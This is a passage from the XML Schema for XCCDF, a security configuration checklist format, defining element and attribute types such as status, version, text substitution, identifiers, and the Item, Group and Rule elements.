                values for the @name attribute may not appear as children of the same
                &lt;xccdf:model&gt; element. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="name" type="xsd:NCName" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The name associated with the contained
                            value.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>


    <xsd:simpleType name="statusType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The statusType represents the possible levels of
                maturity or consensus level for its parent element as recorded by an
                &lt;xccdf:status&gt; element. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="accepted">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Released as final</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="deprecated">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">No longer needed</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="draft">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Released in draft state</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="incomplete">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Under initial development</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="interim">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Revised and in the process of being
                        finalized</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:complexType name="versionType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for most &lt;xccdf:version&gt; elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="time" type="xsd:dateTime" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The time that this version of the
                            associated element was completed. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="update" type="xsd:anyURI" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A URI indicating a location where updates
                            to the associated element may be obtained. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- ********************  Text Types  **************************** -->
    <!-- ************************************************************** -->
    <xsd:complexType name="textType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for a simple text string with an @override
                attribute for controlling inheritance. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute ref="xml:lang"/>
                <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Used to manage inheritance.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="htmlTextType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type for a string with optional XHTML elements and
                an @xml:lang attribute. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any namespace="http://www.w3.org/1999/xhtml" minOccurs="0" maxOccurs="unbounded"
                processContents="skip"/>
        </xsd:sequence>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Used to manage inheritance. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="htmlTextWithSubType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type for a string with optional XHTML elements,
                and an @xml:lang attribute. </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="0" maxOccurs="unbounded">
            <xsd:element name="sub" type="cdf:subType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Specifies an &lt;xccdf:Value&gt; or
                        &lt;xccdf:plain-text&gt; element to be used for text
                        substitution</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:any namespace="http://www.w3.org/1999/xhtml" processContents="skip"/>
        </xsd:choice>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Used to manage inheritance. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="profileNoteType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for an &lt;xccdf:profile-note&gt; within an
                &lt;xccdf:Rule&gt;. This element contains text that describes special aspects of an
                &lt;xccdf:Rule&gt; relative to one or more &lt;xccdf:Profile&gt; elements. This
                allows an author to document things within &lt;xccdf:Rule&gt; elements that are
                specific to a given &lt;xccdf:Profile&gt;. This information might then be displayed
                to a reader based on the selection of a particular &lt;xccdf:Profile&gt;. The body
                text may include XHTML mark-up as well as &lt;xccdf:sub&gt; elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="0" maxOccurs="unbounded">
            <xsd:element name="sub" type="cdf:subType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Specifies an &lt;xccdf:Value&gt; or
                        &lt;xccdf:plain-text&gt; element to be used for text
                        substitution</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:any namespace="http://www.w3.org/1999/xhtml" processContents="skip"/>
        </xsd:choice>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute name="tag" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The identifier of this note. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="textWithSubType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for a string with embedded &lt;xccdf:Value&gt;
                substitutions and an @override attribute to help manage inheritance.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="sub" type="cdf:subType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Specifies an &lt;xccdf:Value&gt; or
                        &lt;xccdf:plain-text&gt; element to be used for text substitution.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Used to manage inheritance. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="subType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The type used for &lt;xccdf:sub&gt; elements. The
                &lt;xccdf:sub&gt; element identifies replacement content that should appear in place
                of the &lt;xccdf:sub&gt; element during text substitution. The subType consists of a
                regular idrefType with an additional @use attribute to dictate the behavior of the
                &lt;xccdf:sub&gt; element under substitution. When the @idref is to an
                &lt;xccdf:Value&gt;, the @use attribute indicates whether the &lt;xccdf:Value&gt;
                element's title or value should replace the &lt;xccdf:sub&gt; element. The @use
                attribute is ignored when the @idref is to an &lt;xccdf:plain-text&gt; element; the
                body of the &lt;xccdf:plain-text&gt; element is always used to replace the
                &lt;xccdf:sub&gt; element.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:idrefType">
                <xsd:attribute name="use" use="optional" default="value" type="cdf:subUseEnumType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Dictates the nature of the content inserted
                            under text substitution processing. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:simpleType name="benchmarkIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Benchmark&gt; elements. xccdf_N_benchmark_S, where N is a reverse-DNS
                style namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_benchmark_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="ruleIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Rule&gt; elements. xccdf_N_rule_S, where N is a reverse-DNS style
                namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_rule_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="groupIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Group&gt; elements. xccdf_N_group_S, where N is a reverse-DNS style
                namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_group_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="valueIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Value&gt; elements. xccdf_N_value_S, where N is a reverse-DNS style
                namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_value_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="profileIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Profile&gt; elements. xccdf_N_profile_S, where N is a reverse-DNS style
                namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_profile_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="testresultIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:TestResult&gt; elements. xccdf_N_testresult_S, where N is a reverse-DNS
                style namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_testresult_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="tailoringIdType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The format required for the @id property of
                &lt;xccdf:Tailoring&gt; elements. xccdf_N_tailoring_S, where N is a reverse-DNS
                style namespace and S is an NCName-compatible string. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:NCName">
            <xsd:pattern value="xccdf_[^_]+_tailoring_.+"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:complexType name="idrefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for elements that contain a reference to
                another XCCDF element </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The id value of another XCCDF
                    element</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="idrefListType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for elements contain list of references to
                other XCCDF elements </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="idref" type="xsd:NMTOKENS" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A space-separated list of id values from other
                    XCCDF elements</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="CPE2idrefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for &lt;xccdf:platform&gt; elements that do
                not need @override attributes. (I.e., &lt;xccdf:platform&gt; elements that are in
                structures that cannot be extended, such as &lt;xccdf:TestResult&gt; and
                &lt;xccdf:Benchmark&gt; elements.) This is used to identify the applicable target
                platform for its respective parent elements. </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="idref" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Should be a CPE 2.3 Applicability Language
                    identifier using the Formatted String binding or the value of a
                    &lt;cpe:platform-specification&gt; element's @id attribute, the latter acting as
                    a reference to some expression defined using the CPE schema in the
                    &lt;xccdf:Benchmark&gt; element's &lt;cpe:platform-specification&gt; element.
                    The @idref may be a CPE Applicability Language identifier using the URI binding,
                    although this is less preferred.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="overrideableCPE2idrefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Data type for &lt;xccdf:platform&gt; elements that need
                @override attributes. (I.e., &lt;xccdf:platform&gt; elements that are in structures
                that can be extended, such as Items and &lt;xccdf:Profile&gt; elements.) This is
                used to identify the applicable target platform for its respective parent elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:CPE2idrefType">
                <xsd:attribute name="override" type="xsd:boolean" use="optional" default="0">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Used to manage inheritance.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- **************** Item Element (Base Class)  ****************** -->
    <!-- ************************************************************** -->
    <xsd:element name="Item" type="cdf:itemType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> An item is a named constituent of an
                &lt;xccdf:Benchmark&gt;. There are three types of items: &lt;xccdf:Group&gt;,
                &lt;xccdf:Rule&gt; and &lt;xccdf:Value&gt;. The &lt;xccdf:Item&gt; element type
                imposes constraints shared by all &lt;xccdf:Group&gt;, &lt;xccdf:Rule&gt; and
                &lt;xccdf:Value&gt; elements. The itemType is abstract, so the element
                &lt;xccdf:Item&gt; can never appear in a valid XCCDF document.</xsd:documentation>
        </xsd:annotation>
    </xsd:element>

    <xsd:complexType name="itemType" abstract="1">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This abstract itemType represents the basic data
                shared by all &lt;xccdf:Group&gt;, &lt;xccdf:Rule&gt; and &lt;xccdf:Value&gt;
                elements. All elements in an itemType are optional, although each element that
                builds on the itemType may add its own elements, some of which will be required for
                that element. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element ref="cdf:status" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Status of the item and date at which it
                        attained that status. &lt;xccdf:Benchmark&gt; authors may use this element
                        to record the maturity or consensus level for elements in the
                        &lt;xccdf:Benchmark&gt;. If an item does not have an explicit
                        &lt;xccdf:status&gt; given, then its status is that of its
                        parent.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="dc-status" minOccurs="0" maxOccurs="unbounded"
                type="cdf:dc-statusType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Holds additional status information using the
                        Dublin Core format.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="version" type="cdf:versionType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Version information about this item.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="title" type="cdf:textWithSubType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Title of the item. Every item should have an
                        &lt;xccdf:title&gt;, because this helps people understand the purpose of the
                        item. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="description" type="cdf:htmlTextWithSubType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Text that describes the item.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="warning" type="cdf:warningType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A note or caveat about the item intended to
                        convey important cautionary information for the &lt;xccdf:Benchmark&gt; user
                        (e.g., “Complying with this rule will cause the system to reject all IP
                        packets”). If multiple &lt;xccdf:warning&gt; elements appear, benchmark
                        consumers should concatenate them for generating reports or documents.
                        Benchmark consumers may present this information in a special manner in
                        generated documents.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="question" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Interrogative text to present to the user
                        during tailoring. It may also be included into a generated document. For
                        &lt;xccdf:Rule&gt; and &lt;xccdf:Group&gt; elements, the
                        &lt;xccdf:question&gt; text should be a simple binary (yes/no) question
                        because it is supporting the selection aspect of tailoring. For
                        &lt;xccdf:Value&gt; elements, the &lt;xccdf:question&gt; should solicit the
                        user to provide a specific value. Tools may also display constraints on
                        values and any defaults as specified by the other &lt;xccdf:Value&gt;
                        properties.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="reference" type="cdf:referenceType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">References where the user can learn more about
                        the subject of this item. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">XML metadata associated with this item, such as
                        sources, special information, or other details. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="abstract" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If true, then this item is abstract and exists only
                    to be extended. The use of this attribute for &lt;xccdf:Group&gt; elements is
                    deprecated and should be avoided. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="cluster-id" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier to be used as a means to identify
                    (refer to) related items. It designates membership in a cluster of items, which
                    are used for controlling items via &lt;xccdf:Profile&gt; elements. All the items
                    with the same cluster identifier belong to the same cluster. A selector in an
                    &lt;xccdf:Profile&gt; may refer to a cluster, thus making it easier for authors
                    to create and maintain &lt;xccdf:Profile&gt; elements in a complex
                    &lt;xccdf:Benchmark&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="extends" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The identifier of an item on which to base this
                    item. If present, it must have a value equal to the @id attribute of another
                    item. The use of this attribute for &lt;xccdf:Group&gt; elements is deprecated
                    and should be avoided. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="hidden" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If this item should be excluded from any generated
                    documents although it may still be used during assessments. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="prohibitChanges" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If benchmark producers should prohibit changes to
                    this item during tailoring. An author should use this when they do not want to
                    allow end users to change the item. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute ref="xml:lang"/>
        <xsd:attribute ref="xml:base"/>
        <xsd:attribute name="Id" type="xsd:ID" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier used for referencing elements
                    included in an XML signature</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- ************ Selectable Item Type (Base Class)  ************** -->
    <!-- ************************************************************** -->
    <xsd:complexType name="selectableItemType" abstract="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This abstract item type represents the basic data
                shared by all &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt; elements.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:itemType">
                <xsd:sequence>
                    <xsd:element name="rationale" type="cdf:htmlTextWithSubType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Descriptive text giving rationale or
                                motivations for abiding by this
                                &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; (i.e., why it is important to
                                the security of the target platform).</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="platform" type="cdf:overrideableCPE2idrefType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Platforms to which this
                                &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; applies.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="requires" type="cdf:idrefListType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">The identifiers of other
                                &lt;xccdf:Group&gt; or &lt;xccdf:Rule&gt; elements that must be
                                selected for this &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; to be
                                evaluated and scored properly. Each &lt;xccdf:requires&gt; element
                                specifies a list of one or more required items by their identifiers.
                                If at least one of the specified &lt;xccdf:Group&gt; or
                                &lt;xccdf:Rule&gt; elements is selected, the requirement is met.
                            </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="conflicts" type="cdf:idrefType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">The identifier of another
                                &lt;xccdf:Group&gt; or &lt;xccdf:Rule&gt; that must be unselected
                                for this &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; to be evaluated and
                                scored properly. Each &lt;xccdf:conflicts&gt; element specifies a
                                single conflicting item using its idref attribute. If the specified
                                &lt;xccdf:Group&gt; or &lt;xccdf:Rule&gt; element is not selected,
                                the requirement is met.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:sequence>
                <xsd:attribute name="selected" type="xsd:boolean" default="true" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">If true, this
                            &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt; is selected to be processed as
                            part of the &lt;xccdf:Benchmark&gt; when it is applied to a target
                            system. An unselected &lt;xccdf:Group&gt; does not get processed, and
                            its contents are not processed either (i.e., all descendants of an
                            unselected &lt;xccdf:Group&gt; are implicitly unselected). An unselected
                            &lt;xccdf:Rule&gt; is not checked and does not contribute to scoring.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="weight" type="cdf:weightType" default="1.0" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The relative scoring weight of this
                            &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt;, for computing a score, expressed
                            as a non-negative real number. It denotes the importance of an
                            &lt;xccdf:Group&gt;/&lt;xccdf:Rule&gt;. Under some scoring models,
                            scoring is computed independently for each collection of sibling
                            &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt; elements, then normalized as
                            part of the overall scoring process.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- **********************  Group Element  *********************** -->
    <!-- ************************************************************** -->
    <xsd:element name="Group" type="cdf:groupType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">An item that can hold other items. It allows an author
                to collect related items into a common structure and provide descriptive text and
                references about them.</xsd:documentation>
        </xsd:annotation>
    </xsd:element>

    <xsd:complexType name="groupType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:Group&gt; element. A
                &lt;xccdf:Group&gt; element contains descriptive information about a portion of an
                &lt;xccdf:Benchmark&gt;, as well as &lt;xccdf:Rule&gt;, &lt;xccdf:Value&gt;, and/or
                other &lt;xccdf:Group&gt; elements</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:selectableItemType">
                <xsd:sequence>
                    <xsd:element ref="cdf:Value" minOccurs="0" maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">&lt;xccdf:Value&gt; elements that
                                belong to this &lt;xccdf:Group&gt;. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:choice minOccurs="0" maxOccurs="unbounded">
                        <xsd:element ref="cdf:Group">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">Sub-&lt;xccdf:Groups&gt; under this
                                    &lt;xccdf:Group&gt;. </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                        <xsd:element ref="cdf:Rule">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">&lt;xccdf:Rule&gt; elements that
                                    belong to this &lt;xccdf:Group&gt;. </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                    </xsd:choice>
                    <xsd:element name="signature" type="cdf:signatureType" minOccurs="0"
                        maxOccurs="1">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A digital signature asserting
                                authorship and allowing verification of the integrity of the
                                &lt;xccdf:Group&gt;. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:sequence>
                <xsd:attribute name="id" type="cdf:groupIdType" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Unique element identifier; used by other
                            elements to refer to this element. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- ********************  Rule Element  ************************** -->
    <!-- ************************************************************** -->
    <xsd:element name="Rule" type="cdf:ruleType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The &lt;xccdf:Rule&gt; element contains the
                description for a single item of guidance or constraint. &lt;xccdf:Rule&gt; elements
                form the basis for testing a target platform for compliance with an
                &lt;xccdf:Benchmark&gt;, for scoring, and for conveying descriptive prose,
                identifiers, references, and remediation information. </xsd:documentation>
        </xsd:annotation>
        <xsd:unique name="ruleCheckSelectorKey">
            <xsd:selector xpath="./cdf:check"/>
            <xsd:field xpath="@selector"/>
            <xsd:field xpath="@system"/>
        </xsd:unique>
        <xsd:unique name="ruleCheckIdKey">
            <xsd:selector xpath=".//cdf:check"/>
            <xsd:field xpath="@id"/>
        </xsd:unique>
    </xsd:element>

    <xsd:complexType name="ruleType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:Rule&gt; element that
                represents a specific &lt;xccdf:Benchmark&gt; test. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:selectableItemType">
                <xsd:sequence>
                    <xsd:element name="ident" type="cdf:identType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A globally meaningful identifier for
                                this &lt;xccdf:Rule&gt;. This may be the name or identifier of a
                                security configuration issue or vulnerability that the
                                &lt;xccdf:Rule&gt; assesses.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="impact-metric" type="xsd:string" minOccurs="0" maxOccurs="1">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">The potential impact of failure to
                                conform to the &lt;xccdf:Rule&gt;, expressed as a CVSS 2.0 base
                                vector. </xsd:documentation>
                            <xsd:appinfo>
                                <deprecated_info>
                                    <version>1.2</version>
                                    <reason>The &lt;xccdf:impact-metric&gt; property was found to be
                                        of little use in the anticipated XCCDF use-cases.</reason>
                                    <comment>While there is no direct replacement for this property,
                                        authors seeking to include equivalent information can use an
                                        &lt;xccdf:Rule&gt; element's &lt;xccdf:metadata&gt; property
                                        to hold this information.</comment>
                                </deprecated_info>
                            </xsd:appinfo>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="profile-note" minOccurs="0" type="cdf:profileNoteType"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Text that describes special aspects of
                                the &lt;xccdf:Rule&gt; related to one or more &lt;xccdf:Profile&gt;
                                elements. This allows an author to document things within
                                &lt;xccdf:Rule&gt; elements that are specific to a given
                                &lt;xccdf:Profile&gt;, and then select the appropriate text based on
                                the selected &lt;xccdf:Profile&gt; and display it to the
                                reader.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="fixtext" type="cdf:fixTextType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Data that describes how to bring a
                                target system into compliance with this
                                &lt;xccdf:Rule&gt;.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="fix" type="cdf:fixType" minOccurs="0" maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A command string, script, or other
                                system modification statement that, if executed on the target
                                system, can bring it into full, or at least better, compliance with
                                this &lt;xccdf:Rule&gt;.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:choice>
                        <xsd:element name="check" type="cdf:checkType" minOccurs="0"
                            maxOccurs="unbounded">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">The definition of, or a reference
                                    to, the target system check needed to test compliance with this
                                    &lt;xccdf:Rule&gt;. Sibling &lt;xccdf:check&gt; elements must
                                    have different values for the combination of their @selector and
                                    @system attributes, and must have different values for their @id
                                    attribute (if any).</xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                        <xsd:element name="complex-check" minOccurs="0" type="cdf:complexCheckType"
                            maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">A boolean expression composed of
